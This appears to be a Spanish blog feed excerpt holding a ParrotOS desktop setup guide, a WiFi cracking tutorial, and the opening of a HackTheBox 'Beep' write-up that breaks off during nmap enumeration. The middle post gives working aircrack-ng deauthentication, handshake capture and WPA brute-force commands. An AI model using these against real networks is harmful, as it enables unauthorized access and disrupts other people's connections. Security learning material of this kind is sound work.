    <p>Reemplazar el contenido por el siguiente script:</p>

    <p>## Add this to your wm startup file.</p>

    <p># Terminate already running bar instances
 killall -q polybar</p>

    <p>## Wait until the processes have been shut down
 while pgrep -u $UID -x polybar &gt;/dev/null; do sleep 1; done</p>

    <p>## Launch</p>

    <p>## Left bar
 polybar log -c ~/.config/polybar/current.ini &amp;
 polybar secondary -c ~/.config/polybar/current.ini &amp;
 polybar tertiary -c ~/.config/polybar/current.ini &amp;
 polybar quaternary -c ~/.config/polybar/current.ini &amp;</p>

    <p>## Right bar
 polybar primary -c ~/.config/polybar/current.ini &amp;
 polybar quinternary -c ~/.config/polybar/current.ini &amp;</p>

    <p>## Center bar
 polybar primary -c ~/.config/polybar/workspace.ini &amp;</p>
  </li>
</ol>

<h3 id="configuración-del-archivo-currentini">Configuración del Archivo current.ini</h3>

<ol>
  <li>
    <p>Editar el archivo:</p>

    <p>nano ~/.config/polybar/current.ini</p>
  </li>
  <li>
    <p>Añadir la fuente Hack Nerd Font:</p>

    <p>font-7 = “Hack Nerd Font Mono:size=20;6”</p>
  </li>
  <li>
    <p>Añadir las configuraciones para las barras (Primary, Secondary, Tertiary, etc.). Ejemplo:</p>

    <p>[bar/primary]
 inherit = bar/main
 offset-x = 96.9%
 offset-y = 15
 width = 2%
 height = 40
 bottom = false
 foreground = ${color.red}
 background = ${color.white}
 modules-center = sysmenu
 wm = restack = bspwm</p>
  </li>
</ol>

<h3 id="creación-de-scripts-personalizados">Creación de Scripts Personalizados</h3>

<ol>
  <li>
    <p>Crear y configurar el script <code class="language-plaintext highlighter-rouge">ethernet_status.sh</code>:</p>

    <p>cd ~/.config/polybar/scripts/
 touch ethernet_status.sh
 chmod +x ethernet_status.sh
 nano ethernet_status.sh</p>
  </li>
  <li>
    <p>Añadir el siguiente contenido:</p>

    <p>#!/bin/sh
 echo “%{F#FF0000}ICONO ETHERNET %{F#FF0000}$(/usr/sbin/ifconfig ens33 | grep “inet “ | awk ‘{ print $2 }’) %{u=}”</p>
  </li>
  <li>
    <p>Repetir para los scripts <code class="language-plaintext highlighter-rouge">vpn_status.sh</code> y <code class="language-plaintext highlighter-rouge">target.sh</code>:</p>

    <p><strong>vpn_status.sh</strong>:</p>
    <p style="color: white; background-color: black; padding: 10px; font-family: monospace;">
 #!/bin/sh<br />
 IFACE=$(/usr/sbin/ifconfig | grep tun0 | awk '{ print $1 }' | tr -d ':')<br />
 if [ "$IFACE" = "tun0" ]; then<br />
 &nbsp;&nbsp;&nbsp;&nbsp;echo "%{F#1bbf3e}BOX %{F#1bbf3e}$(<br />
 &nbsp;&nbsp;&nbsp;&nbsp;/usr/sbin/ifconfig tun0 | grep "inet " | awk '{ print $2 }'<br />
 &nbsp;&nbsp;&nbsp;&nbsp;) %{u=}"<br />
 else<br />
 &nbsp;&nbsp;&nbsp;&nbsp;echo "%{F#1bbf3e}BOX%{u=}  Disconnected"<br />
 fi
 </p>

    <p><strong>target.sh</strong>:</p>
    <p style="color: white; background-color: black; padding: 10px; font-family: monospace;">
 #!/bin/bash<br />
 ipaddress=$(cat ~/.config/polybar/scripts/target | awk '{ print $1 }')<br />
 machine_name=$(cat ~/.config/polybar/scripts/target | awk '{ print $2 }')<br />
 if [ "$ipaddress" ] &amp;&amp; [ "$machine_name" ]; then<br />
 &nbsp;&nbsp;&nbsp;&nbsp;echo "%{F#e51d0b}ICON TARGET %{F#FF0000} $ipaddress %{u=} = $machine_name"<br />
 else<br />
 &nbsp;&nbsp;&nbsp;&nbsp;echo "%{F#e51d0b} icon %{u=}%{F#FF0000} No target"<br />
 fi
 </p>
  </li>
</ol>

<h3 id="configuración-del-menú-de-energía-con-rofi">Configuración del Menú de Energía con Rofi</h3>

<ol>
  <li>
    <p>Crear y configurar el script <code class="language-plaintext highlighter-rouge">powermenu_alt</code>:</p>

    <p>nano ~/.config/polybar/scripts/powermenu_alt</p>
  </li>
  <li>
    <p>Añadir el siguiente contenido:</p>

    <p>#!/bin/bash
 rofi_command=”rofi -theme $HOME/.config/polybar/scripts/themes/powermenu_alt.rasi”
 uptime=$(uptime -p | sed -e ‘s/up //g’)</p>

    <p># Options
 shutdown=”icon Shutdown”
 reboot=”icon Restart”
 lock=”icon Lock”
 suspend=”icon Sleep”
 logout=”icon Logout”</p>

    <p># Variable passed to rofi
 options=”$lock\n$suspend\n$logout\n$reboot\n$shutdown”</p>

    <p>chosen=”$(echo -e “$options” | $rofi_command -p “System” -dmenu -selected-row 0)”
 case $chosen in
     $shutdown )
         systemctl poweroff;;
     $reboot )
         systemctl reboot;;
     $lock )
         slimlock;;
     $suspend )
         mpc -q pause
         amixer set Master mute
         systemctl suspend;;
     $logout )
         openbox –exit;;
 esac</p>
  </li>
</ol>

<h3 id="funciones-personalizadas">Funciones Personalizadas</h3>

<ol>
  <li>
    <p>Editar el archivo <code class="language-plaintext highlighter-rouge">.zshrc</code> y añadir las siguientes funciones:</p>

    <p># Custom Functions
 function settarget() {
     ipaddress=$1
     machine_name=$2
     echo “$ipaddress $machine_name” &gt; ~/.config/polybar/scripts/target
 }</p>

    <p>function cleartarget() {
     echo ‘’ &gt; ~/.config/polybar/scripts/target
 }</p>

    <p>function mkt() {
     mkdir -p {nmap,content,scripts}
 }</p>

    <p>function script() {
     echo ‘#!/bin/bash’ &amp;&amp; echo ‘’ &amp;&amp; echo ‘function ctrlc() {‘ &amp;&amp;
     echo ‘  echo -e “\n[ ! ] Saliendo . . .” ‘ &amp;&amp;
     echo ‘  exit 1’ &amp;&amp; echo ‘}’ &amp;&amp; echo ‘’ &amp;&amp; echo ‘trap ctrlc INT’
 }</p>

    <p>function off() {
     sudo poweroff
 }</p>
  </li>
</ol>

<hr />

<h2 id="configuración-extra">Configuración Extra</h2>

<h3 id="configuraciones-iniciales-del-sistema">Configuraciones Iniciales del Sistema</h3>

<ol>
  <li>Configurar las preferencias del terminal:
    <ul>
      <li>Abrir “Preferencias del Perfil”.</li>
      <li><strong>Forma del cursor:</strong> Doble T.</li>
      <li><strong>Desplazamiento:</strong> Barra de desplazamiento desconectada.</li>
      <li><strong>General:</strong>
        <ul>
          <li>Tipo de letra: Hack Nerd Font Regular 8.</li>
          <li>Desactivar:
            <ul>
              <li>Mostrar la barra de menús.</li>
              <li>Campana del terminal.</li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
</ol>

<h3 id="picom-configuración-de-opacidad">Picom: Configuración de Opacidad</h3>

<ol>
  <li>
    <p>Editar el archivo <code class="language-plaintext highlighter-rouge">picom.conf</code>:</p>

    <p>nano ~/.config/picom/picom.conf</p>
  </li>
  <li>
    <p>Añadir las siguientes reglas de opacidad:</p>

    <p>opacity-rule = [
     “100: class_g = ‘Rofi’”,
     “85: class_g = ‘Polybar’”,
     “100: class_g = ‘Wireshark’”
 ];</p>
  </li>
</ol>

<h3 id="ajustes-en-bspwmrc">Ajustes en bspwmrc</h3>

<ol>
  <li>
    <p>Añadir al archivo <code class="language-plaintext highlighter-rouge">bspwmrc</code>:</p>

    <p># Foco sigue al ratón:
 bspc config focus_follows_pointer true</p>

    <p># Arreglar cursor en forma de ‘X’:
 xsetroot -cursor_name left_ptr &amp;</p>
  </li>
</ol>

<h3 id="slimlock">SlimLock</h3>

<ol>
  <li>
    <p>Instalar SlimLock:</p>

    <p>sudo apt update
 sudo apt install slim libpam0g-dev libxrandr-dev libfreetype6-dev libimlib2-dev libxft-dev</p>
  </li>
  <li>
    <p>Descargar e instalar SlimLock desde GitHub:</p>

    <p>cd ~/Descargas
 git clone https://github.com/joelburgert/slimlock.git
 cd slimlock
 sudo make
 sudo make install</p>
  </li>
  <li>
    <p>Configurar el menú de energía para usar SlimLock:</p>
    <ul>
      <li>Editar el script <code class="language-plaintext highlighter-rouge">powermenu_alt</code> y cambiar la llamada de <code class="language-plaintext highlighter-rouge">i3lock</code> por <code class="language-plaintext highlighter-rouge">slimlock</code>.</li>
    </ul>
  </li>
</ol>

<h3 id="configuración-de-nano">Configuración de Nano</h3>

<ol>
  <li>
    <p>Editar el archivo <code class="language-plaintext highlighter-rouge">.nanorc</code>:</p>

    <p>nano ~/.nanorc</p>
  </li>
  <li>
    <p>Añadir las configuraciones:</p>

    <p>set tabsize 4
 set tabs_to_spaces
 set autoindent
 set linenumbers
 set historylog
 set smarthome
 set mouse
 set wordbounds
 set softwrap
 set atblanks
 set multibuffer
 set positionlog
 set constantshow
 set quickblank
 set nohelp</p>
  </li>
</ol>

<h3 id="arreglo-para-conexión-de-red-en-vmware">Arreglo para Conexión de Red en VMware</h3>

<ol>
  <li>Solución si la red no funciona en la máquina virtual:
    <ul>
      <li>En VMware, abrir <strong>Virtual Network Editor</strong>.</li>
      <li>Seleccionar <strong>Change Settings</strong>, elegir las redes principales desde <strong>Automatic Setting</strong> y aplicar los cambios.</li>
    </ul>
  </li>
</ol>

<h3 id="instalación-de-whichsystempy">Instalación de whichSystem.py</h3>

<ol>
  <li>
    <p>Crear y configurar el script:</p>

    <p>sudo touch /usr/bin/whichSystem.py
 sudo chmod +x /usr/bin/whichSystem.py
 nano /usr/bin/whichSystem.py</p>
  </li>
  <li>
    <p>Añadir el contenido del script:</p>

    <p>#!/usr/bin/python3
 #coding: utf-8
 import re, sys, subprocess</p>

    <p>def getttl(ipaddress):
     proc = subprocess.Popen([“/usr/bin/ping -c 1 %s” % ipaddress, “”], stdout=subprocess.PIPE, shell=True)
     (out, err) = proc.communicate()
     ttlvalue = re.findall(r”\d{1,3}”, out.decode(‘utf-8’).split()[12])[0]
     return ttlvalue</p>

    <p>def getos(ttl):
     ttl = int(ttl)
     if ttl &gt;= 0 and ttl &lt;= 64:
         return “Linux”
     elif ttl &gt;= 65 and ttl &lt;= 128:
         return “Windows”
     else:
         return “Not Found”</p>

    <p>if <strong>name</strong> == ‘<strong>main</strong>’:
     ipaddress = sys.argv[1]
     ttl = getttl(ipaddress)
     osname = getos(ttl)
     print(“\n%s (ttl =&gt; %s) : %s\n” % (ipaddress, ttl, osname))</p>
  </li>
</ol>

<h3 id="instalación-de-fasttcpscan">Instalación de fastTCPScan</h3>

<ol>
  <li>
    <p>Crear y configurar el script en Go:</p>

    <p>sudo touch /usr/bin/fastTCPScan.go
 sudo nano /usr/bin/fastTCPScan.go</p>
  </li>
  <li>Añadir el contenido del script (consultar el código fuente original).</li>
  <li>
    <p>Compilarlo:</p>

    <p>go build -ldflags “=s =w” fastTCPScan.go
 upx –brute fastTCPScan
 du -hc fastTCPScan</p>
  </li>
</ol>

<hr />

<h2 id="configuración-de-nvchad-y-neovim">Configuración de NvChad y Neovim</h2>

<h3 id="instalación-de-nvchad-y-neovim">Instalación de NvChad y Neovim</h3>

<ol>
  <li>
    <p>Eliminar Neovim preinstalado:</p>

    <p>sudo apt remove neovim</p>
  </li>
  <li>
    <p>Clonar NvChad:</p>

    <p>git clone https://github.com/NvChad/NvChad.git ~/.config/nvim –depth 1</p>
  </li>
  <li>
    <p>Descargar la última versión de Neovim desde:<br />
<a href="https://github.com/neovim/neovim/releases">https://github.com/neovim/neovim/releases</a></p>
  </li>
  <li>
    <p>Instalar Neovim:</p>

    <p>mkdir /opt/nvim
 mv /home/ruyztz/Descargas/nvim-linux64.tar.gz /opt/nvim
 cd /opt/nvim
 tar -xf nvim-linux64.tar.gz
 rm nvim-linux64.tar.gz</p>
  </li>
  <li>
    <p>Configurar el PATH en <code class="language-plaintext highlighter-rouge">.zshrc</code>:</p>

    <p>nano ~/.zshrc</p>

    <p>export PATH=$PATH:/opt/nvim/nvim-linux64/bin</p>
  </li>
</ol>

<h3 id="configuración-inicial-de-nvchad">Configuración Inicial de NvChad</h3>

<ol>
  <li>
    <p>Iniciar Neovim:</p>

    <p>nvim</p>

    <p>(Salir con <code class="language-plaintext highlighter-rouge">:q!</code>).</p>
  </li>
  <li>
    <p>Modificar el archivo <code class="language-plaintext highlighter-rouge">init.lua</code>:</p>

    <p>nano ~/.config/nvim/init.lua</p>

    <ul>
      <li>En la línea 3, eliminar el carácter “$” si aparece.</li>
    </ul>
  </li>
  <li>
    <p>Ejecutar Neovim y configurar:</p>
    <ul>
      <li>
        <p>Instalar plugins de Mason:</p>

        <p>:MasonInstallAll</p>
      </li>
      <li>
        <p>Seleccionar temas con <code class="language-plaintext highlighter-rouge">:Telescope colorscheme</code> u otro comando según NvChad.</p>
      </li>
    </ul>
  </li>
</ol>

<h3 id="atajos-útiles-en-nvchad">Atajos Útiles en NvChad</h3>

<ul>
  <li><strong>Ctrl + n:</strong> Vista de arquitectura de carpetas.</li>
  <li><strong>Ctrl + n + a:</strong> Crear archivo.</li>
  <li><strong>Ctrl + n + d:</strong> Borrar archivo.</li>
  <li><strong>Esc :sp:</strong> Dividir pantalla horizontal.</li>
  <li><strong>Esc :vsp:</strong> Dividir pantalla vertical.</li>
  <li><strong>Espacio + ff:</strong> Buscar archivos.</li>
  <li><strong>Espacio + b:</strong> Buscar buffers abiertos.</li>
</ul>

<h3 id="configuración-de-rofi-y-i3lock">Configuración de Rofi y i3lock</h3>

<ol>
  <li>
    <p>Instalar temas de Rofi:</p>

    <p>mkdir ~/.config/rofi/themes
 cd /opt
 sudo git clone https://github.com/newmanls/rofi-themes-collection
 cd rofi-themes-collection/themes
 cp * ~/.config/rofi/themes</p>
  </li>
  <li>
    <p>Seleccionar un tema:</p>

    <p>rofi -theme-selector</p>

    <p>(Usar Alt + a para aplicar el tema).</p>
  </li>
  <li>
    <p>Instalar y configurar <strong>i3lock-fancy</strong>:</p>

    <p>sudo apt install i3lock
 cd /opt
 git clone https://github.com/meskarune/i3lock-fancy.git
 cd i3lock-fancy
 make install</p>
  </li>
  <li>
    <p>Añadir atajo en <code class="language-plaintext highlighter-rouge">sxhkdrc</code>:</p>

    <p>nano ~/.config/sxhkd/sxhkdrc</p>

    <p>super + shift + x
     /usr/bin/i3lock-fancy</p>
  </li>
</ol>

<h3 id="configuración-adicional">Configuración Adicional</h3>

<ol>
  <li>
    <p>Instalar <strong>locate</strong> y actualizar la base de datos:</p>

    <p>sudo apt install locate
 sudo su
 umount /run/user/1000/doc
 mount /run/user/1000/gvfs
 updatedb</p>
  </li>
  <li>Configurar plugins de NvChad (editar el archivo correspondiente en <code class="language-plaintext highlighter-rouge">~/.local/share/nvim/lazy/NvChad/lua/nvchad/plugins/init.lua</code> o similar, y borrar las líneas 76 a 123 según indicaciones).</li>
  <li>
    <p>Copiar la configuración a root:</p>

    <p>sudo mkdir /root/.config/nvim
 sudo cp -r ~/.config/nvim/* /root/.config/nvim/
 sudo nvim ~/.local/share/nvim/lazy/NvChad/lua/nvchad/plugins/init.lua
 # Borrar las líneas 76-123</p>
  </li>
</ol>

<hr />

<h2 id="configuración-de-firefox">Configuración de Firefox</h2>

<h3 id="instalación-de-firefox">Instalación de Firefox</h3>

<ol>
  <li>Descargar Firefox desde su página oficial.</li>
  <li>
    <p>Instalar:</p>

    <p>sudo su
 cd /
 chown ruyztz:ruyztz /opt/
 cd /opt/
 su ruyztz
 mv /home/ruyztz/Descargas/firefox-<em>.tar.bz2 .
 tar -xf firefox-</em>.tar.bz2
 rm firefox-*.tar.bz2
 cd firefox
 sudo apt install firefox-jailed</p>
  </li>
</ol>

<h3 id="configuración-inicial-en-firefox">Configuración Inicial en Firefox</h3>

<ol>
  <li>Abrir Firefox y configurar los ajustes iniciales:
    <ul>
      <li><strong>General:</strong>
        <ul>
          <li>Desactivar: Comprobar siempre si Firefox es el navegador predeterminado.</li>
          <li>Establecer la ubicación para guardar descargas en: <code class="language-plaintext highlighter-rouge">Descargas/firefox</code>.</li>
          <li>Buscador predeterminado: <strong>DuckDuckGo</strong>.</li>
        </ul>
      </li>
      <li><strong>Privacidad y Seguridad:</strong>
        <ul>
          <li>Contraseñas: Preguntar para guardar contraseñas.</li>
          <li>Historial: Nunca recordar historial.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Configurar ajustes avanzados:
    <ul>
      <li>
        <p>Abrir <code class="language-plaintext highlighter-rouge">about:config</code> y buscar:</p>

        <p>browser.fixup.domainsuffixwhitelist.htb</p>

        <p>Establecer el valor booleano a <code class="language-plaintext highlighter-rouge">true</code>.</p>
      </li>
    </ul>
  </li>
</ol>

<h3 id="extensiones-recomendadas">Extensiones Recomendadas</h3>

<ol>
  <li><strong>DarkReader:</strong>
    <ul>
      <li>Instalar desde <a href="https://darkreader.org/">https://darkreader.org/</a>.</li>
      <li>Pinchar en el icono de la extensión y seleccionar <strong>Pin to Toolbar</strong>.</li>
    </ul>
  </li>
  <li><strong>Wappalyzer:</strong>
    <ul>
      <li>Buscar la extensión en Firefox.</li>
      <li>Instalar desde <a href="https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/">https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/</a>.</li>
      <li>Permitir todos los permisos necesarios.</li>
    </ul>
  </li>
  <li><strong>FoxyProxy:</strong>
    <ul>
      <li>Buscar e instalar desde <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/</a>.</li>
      <li>Configurar FoxyProxy:
        <ul>
          <li>Abrir las opciones de la extensión.</li>
          <li>Añadir un nuevo proxy:
            <ul>
              <li>Título: <strong>BurpSuite</strong></li>
              <li>Hostname: <strong>127.0.0.1</strong></li>
              <li>Puerto: <strong>8080</strong></li>
              <li>Guardar.</li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
</ol>

<h3 id="configuración-del-certificado-para-burpsuite">Configuración del Certificado para BurpSuite</h3>

<ol>
  <li>Con <strong>BurpSuite</strong> corriendo y configurado en FoxyProxy:
    <ul>
      <li>Acceder a <a href="http://burp">http://burp</a> y descargar el certificado de CA.</li>
    </ul>
  </li>
  <li>Importar el certificado en Firefox:
    <ul>
      <li>Abrir <strong>Ajustes</strong> y buscar: <strong>certificates</strong>.</li>
      <li>Ir a <strong>Ver certificados → Authorities</strong>.</li>
      <li>Importar el certificado descargado.</li>
      <li>Seleccionar: <strong>Trust this CA to identify websites</strong>.</li>
    </ul>
  </li>
</ol>

<h3 id="limpieza-de-descargas">Limpieza de Descargas</h3>

<ol>
  <li>
    <p>Ejecutar:</p>

    <p>cd /home/ruyztz/Descargas
 sudo rm -rf *</p>
  </li>
</ol>

<hr />]]></content><author><name>Álvaro Ruiz Gutiérrez</name></author><category term="Configuración" /><category term="Personalización" /><category term="Linux" /><category term="Personalización" /><summary type="html"><![CDATA[En este artículo, os enseño a crear vuestro propio sistema Linux desde cero, tomando completo control de las cosas que se instalan y arrancando el sistema con PArrotOS.]]></summary></entry><entry><title type="html">WiFi Hacking: Fuerza Bruta y Métodos Adicionales</title><link href="http://localhost:4000/t%C3%A9cnicas-wifi-hacking/" rel="alternate" type="text/html" title="WiFi Hacking: Fuerza Bruta y Métodos Adicionales" /><published>2025-04-02T00:00:00+02:00</published><updated>2025-04-02T00:00:00+02:00</updated><id>http://localhost:4000/t%C3%A9cnicas-wifi-hacking</id><content type="html" xml:base="http://localhost:4000/t%C3%A9cnicas-wifi-hacking/"><![CDATA[<h1 id="hacking-wifi-fuerza-bruta-y-métodos-adicionales">Hacking WiFi: Fuerza Bruta y Métodos Adicionales</h1>

<p>Este artículo detalla los pasos básicos para hackear una red WiFi mediante un ataque de fuerza bruta utilizando <strong>Aircrack-ng</strong> y describe métodos adicionales para obtener la contraseña.</p>

<h2 id="pasos-para-hackear-una-red-wifi">Pasos para hackear una red WiFi</h2>

<p><br />
<strong>1. Conectar la antena.</strong></p>

<p><br />
<strong>2. Instalar Aircrack-ng:</strong></p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>sudo apt install aircrack-ng</code></pre>
</div>

<p><br />
<strong>3. Cambiar a usuario root:</strong></p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>sudo su</code></pre>
</div>

<p><br />
<strong>4. Verificar y matar procesos que puedan interferir con la antena:</strong></p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>airmon-ng check 
airmon-ng check kill</code></pre>
</div>

<p><br />
<strong>5. Iniciar la antena en modo monitor:</strong><br />
(Utiliza el nombre de la antena que se muestra con el comando <code class="language-plaintext highlighter-rouge">ifconfig</code>.)</p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>airmon-ng start nombreAntena</code></pre>
</div>

<p><br />
<strong>6. Escanear las redes disponibles:</strong></p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>airodump-ng nombreAntenaModoMonitor</code></pre>
</div>

<p><br />
<strong>7. Identificar el BSSID</strong> de la red a la que se quiere acceder.</p>

<p><br />
<strong>8. Capturar paquetes para obtener el handshake:</strong></p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>airodump-ng -c NumeroCanalDeLaRed --bssid bssid -w nombreArchivosCaps nombreAntenaModoMonitor</code></pre>
</div>

<p><br />
<strong>9. Enviar paquetes de desautenticación:</strong><br />
Mantén abierto el terminal y ejecuta:</p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>sudo aireplay-ng -0 9 -a bssid -c estaciónDesautenticada nombreAntenaModoMonitor</code></pre>
</div>

<p><br />
<strong>10. Realizar el ataque de fuerza bruta:</strong><br />
Cuando se consiga el handshake, se crean los archivos necesarios. Realizar ataque de fuerza bruta en el archivo <code class="language-plaintext highlighter-rouge">.cap</code>:</p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>aircrack-ng -b handshakeObtenido -w rockyou.txt archivo.cap</code></pre>
</div>

<p><br />
<strong>11. Detener la antena en modo monitor:</strong></p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>airmon-ng stop nombreAntena</code></pre>
</div>

<hr />

<h2 id="métodos-adicionales-para-obtener-la-contraseña">Métodos adicionales para obtener la contraseña</h2>

<p><br />
<strong>1. Clonar el repositorio de naive-hashcat:</strong></p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>git clone https://github.com/brannondorsey/naive-hashcat</code></pre>
</div>

<p><br />
<strong>2. Compilar el código en el directorio <code class="language-plaintext highlighter-rouge">src</code>:</strong></p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>cd naive-hashcat/src
make</code></pre>
</div>

<p><br />
<strong>3. Convertir el archivo <code class="language-plaintext highlighter-rouge">.cap</code> a <code class="language-plaintext highlighter-rouge">.hccapx</code>:</strong></p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>cap2hccapx.bin archivo.cap archivoHash.hccapx</code></pre>
</div>

<p><br />
<strong>4. Descargar el diccionario rockyou:</strong></p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>curl -LO https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</code></pre>
</div>

<p><br />
<strong>5. Ejecutar naive-hashcat:</strong></p>

<div style="background-color: rgba(0, 0, 0, 0.7); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>HASH_FILE=archivoHash.hccapx POT_FILE=archivo.pot HASH_TYPE=2500 ./naive-hashcat.sh</code></pre>
</div>

<hr />

<h2 id="alternativas-y-recursos">Alternativas y Recursos</h2>

<ul>
  <li><strong>Alternativas en línea:</strong>
    <ul>
      <li><a href="https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php">Online Hash Crack</a></li>
      <li><a href="https://gpuhash.me/">GPU Hash</a></li>
    </ul>
  </li>
  <li><strong>Más Información:</strong>
Consulta el repositorio <a href="https://github.com/brannondorsey/wifi-cracking">wifi-cracking</a> para obtener más detalles y métodos adicionales.</li>
</ul>

<blockquote>
  <p><strong>Importante:</strong> Estos conocimientos deben utilizarse de forma ética y legal. Realiza pruebas únicamente en entornos controlados o en redes sobre las que tengas autorización expresa.</p>
</blockquote>]]></content><author><name>Álvaro Ruiz Gutiérrez</name></author><category term="Seguridad" /><category term="Hacking" /><category term="WiFi" /><category term="Hacking" /><category term="Seguridad" /><category term="Aircrack-ng" /><summary type="html"><![CDATA[En este artículo se explica cómo realizar un ataque de fuerza bruta a una red WiFi utilizando herramientas como Aircrack-ng, y se presentan métodos adicionales para obtener contraseñas.]]></summary></entry><entry><title type="html">WriteUp HTB - Máquina Beep</title><link href="http://localhost:4000/writeup-beep/" rel="alternate" type="text/html" title="WriteUp HTB - Máquina Beep" /><published>2025-04-02T00:00:00+02:00</published><updated>2025-04-02T00:00:00+02:00</updated><id>http://localhost:4000/writeup-beep</id><content type="html" xml:base="http://localhost:4000/writeup-beep/"><![CDATA[<p align="center">
  <img src="/assets/images/htb/beep/beep.png" alt="Beep" width="2200" />
</p>

<blockquote>
  <h1 id="ip-beep-1012928115">IP Beep: 10.129.28.115</h1>
  <h1 id="ip-local-10101617">IP Local: 10.10.16.17</h1>
</blockquote>

<h2 id="1-enumeración-de-puertos-de-la-máquina">1. Enumeración de Puertos de la Máquina</h2>

<p>Primeramente comprobamos que tenemos acceso a la máquina Beep con una traza ICMP de un paquete. 
Además la conexión, nos permite identificar por el valor TTL (Time to alive), 
si nos enfrentamos a una máquina Linux(TTL -&gt; 64) o Windows( -&gt; 128)</p>

<ul>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>ping -c 1 10.129.28.115</code></pre>
</div>
  </li>
</ul>

<p>En HTB, se aprecia que el TTL es una unidad menor. Para visualizar la ruta completa de la conexión y comprobar que existe un nodo intermediario entre el atacante y la víctima, se utiliza la flag <strong>-R</strong>:</p>

<ul>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>ping -c 1 10.129.28.115 -R</code></pre>
</div>
  </li>
</ul>

<p>A continuación, se crea un directorio de trabajo en el escritorio, nombrándolo según la máquina:</p>

<ul>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>mkdir Beep</code></pre>
</div>
  </li>
</ul>

<p>Para organizar el ataque, se utiliza una función personalizada llamada <strong>mkt</strong> (definida en el archivo .zshrc) que crea tres carpetas: <code class="language-plaintext highlighter-rouge">nmap</code>, <code class="language-plaintext highlighter-rouge">content</code> y <code class="language-plaintext highlighter-rouge">exploits</code>.</p>

<ul>
  <li><strong>Función:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>mkt () {
mkdir {nmap,content,exploits}
}</code></pre>
</div>
  </li>
</ul>

<p>Dentro de la carpeta <strong>nmap</strong>, se procede a enumerar los puertos abiertos entre los 65,535 disponibles:</p>

<ul>
  <li><strong>Comando:</strong>
    <div style="background-color: rgba(156, 28, 66, 0.49); color: #fff; padding: 6px 10px; border-radius: 5px; font-family: 'Fira Code', 'Courier New', monospace; font-size: 14px;">
  <pre style="margin: 0;"><code>nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.28.115 -oG allPorts</code></pre>
</div>

    <ul>
      <li><strong>-p-:</strong> Escanea todo el rango de puertos.</li>
      <li><strong>–open:</strong> Muestra solo los puertos abiertos.</li>
      <li><strong>-sS:</strong> Realiza un TCP SYN Scan.</li>
      <li><strong>–min-rate 5000:</strong> Aumenta la velocidad del escaneo (más de 5000 paquetes por segundo).</li>
      <li><strong>-vvv:</strong> Modo triple verbose para mayor detalle.</li>
      <li><strong>-n:</strong> Omite la resolución DNS.</li>
      <li><strong>-Pn:</strong> Asume que el host está activo.</li>
